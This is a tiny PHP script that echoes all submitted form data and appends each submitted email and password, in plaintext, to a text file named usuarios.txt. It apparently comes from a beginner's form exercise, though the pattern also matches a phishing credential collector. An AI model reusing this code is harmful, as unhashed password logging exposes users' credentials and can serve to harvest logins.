<?php

var_dump($_POST);
$archivo=fopen("usuarios.txt", "a");
$renglon=$_POST["correo"]."=>".$_POST["contraseña"]."\n";

fwrite($archivo,$renglon);

fclose($archivo);


?>